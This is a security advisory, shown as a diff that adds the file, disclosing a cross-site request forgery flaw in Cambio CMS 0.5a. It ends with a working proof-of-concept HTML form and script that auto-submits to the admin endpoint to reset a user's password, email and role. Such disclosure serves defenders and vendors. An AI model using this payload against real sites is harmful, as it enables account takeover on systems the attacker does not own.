@@ -1,0 +1,32 @@
+Vulnerability ID: HTB22768
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_cambio.html
+Product: Cambio
+Vendor: Joram van den Boezem ( http://www.cambiocms.org/ ) 
+Vulnerable Version: 0.5a nightly r37 and probably prior versions
+Vendor Notification: 28 December 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "modules/user/user.admin.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/index.php?module=user&task=save&elmid=" method="post" name="main">
+<input type="hidden" name="id" value="USERID">
+<input type="hidden" name="module" value="100">
+<input type="hidden" name="newpass1" value="newpass">
+<input type="hidden" name="newpass2" value="newpass">
+<input type="hidden" name="email" value="email@example.com">
+<input type="hidden" name="usertype_id" value="2">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
